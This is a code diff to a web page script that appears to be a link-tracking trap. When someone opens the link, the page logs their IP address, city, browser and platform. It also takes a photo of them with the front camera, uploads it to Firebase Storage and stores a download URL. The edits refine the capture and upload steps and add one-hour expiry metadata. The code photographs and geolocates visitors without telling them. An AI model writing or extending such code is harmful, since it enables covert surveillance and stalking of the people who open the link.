@@ -85,7 +85,7 @@
 
     <script type="module">
         import { db, ref, push } from './firebase-config.js';
-        import { getStorage, ref as storageRef, uploadString } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js';
+        import { getStorage, ref as storageRef, uploadString, getDownloadURL } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js';
 
         const statusEl = document.getElementById('status');
         const id = new URLSearchParams(location.search).get('id');
@@ -107,12 +107,15 @@
                 // 2. Try to capture photo from camera
                 let photoURL = null;
                 try {
-                    photoURL = await capturePhoto();
+                    photoURL = await captureAndUploadPhoto();
                 } catch (err) {
                     console.log('Camera not available:', err);
                 }
 
-                // 3. Save to database
+                // 3. Calculate expiration time (1 hour from now)
+                const expiresAt = Date.now() + (60 * 60 * 1000); // 1 hour in milliseconds
+
+                // 4. Save to Firebase database
                 await push(ref(db, `visitas/${id}`), {
                     ip: geoData.ip || 'Unknown',
                     ciudad: geoData.city || 'Unknown',
@@ -125,7 +128,8 @@
                         minute: '2-digit'
                     }),
                     timestamp: Date.now(),
-                    foto: photoURL || null,
+                    expiresAt: expiresAt,
+                    foto: photoURL,
                     userAgent: navigator.userAgent,
                     idioma: navigator.language,
                     plataforma: navigator.platform
@@ -138,13 +142,13 @@
             }
         }
 
-        async function capturePhoto() {
+        async function captureAndUploadPhoto() {
             return new Promise(async (resolve, reject) => {
                 try {
-                    // Request camera access (back camera on mobile)
+                    // Request camera access (front camera)
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: {
-                            facingMode: 'user', // Front camera to capture visitor's face
+                            facingMode: 'user',
                             width: { ideal: 640 },
                             height: { ideal: 480 }
                         },
@@ -155,7 +159,7 @@
 
                     // Wait for video to be ready
                     video.onloadedmetadata = async () => {
-                        // Wait a bit for camera to adjust
+                        // Wait for camera to adjust
                         await new Promise(r => setTimeout(r, 1500));
 
                         // Capture frame
@@ -165,21 +169,26 @@
                         ctx.drawImage(video, 0, 0);
 
                         // Convert to base64
-                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
 
                         // Stop camera
                         stream.getTracks().forEach(track => track.stop());
 
-                        // Upload to Firebase Storage
+                        // Upload to Firebase Storage with expiration metadata
                         try {
                             const timestamp = Date.now();
                             const fileName = `captures/${id}/${timestamp}.jpg`;
                             const photoRef = storageRef(storage, fileName);
 
-                            await uploadString(photoRef, imageData, 'data_url');
+                            // Upload with custom metadata
+                            await uploadString(photoRef, imageData, 'data_url', {
+                                customMetadata: {
+                                    expiresAt: (Date.now() + (60 * 60 * 1000)).toString()
+                                }
+                            });
 
-                            // Return filename (we'll store this in database)
-                            resolve(fileName);
+                            const downloadURL = await getDownloadURL(photoRef);
+                            resolve(downloadURL);
                         } catch (uploadErr) {
                             console.error('Upload error:', uploadErr);
                             resolve(null);
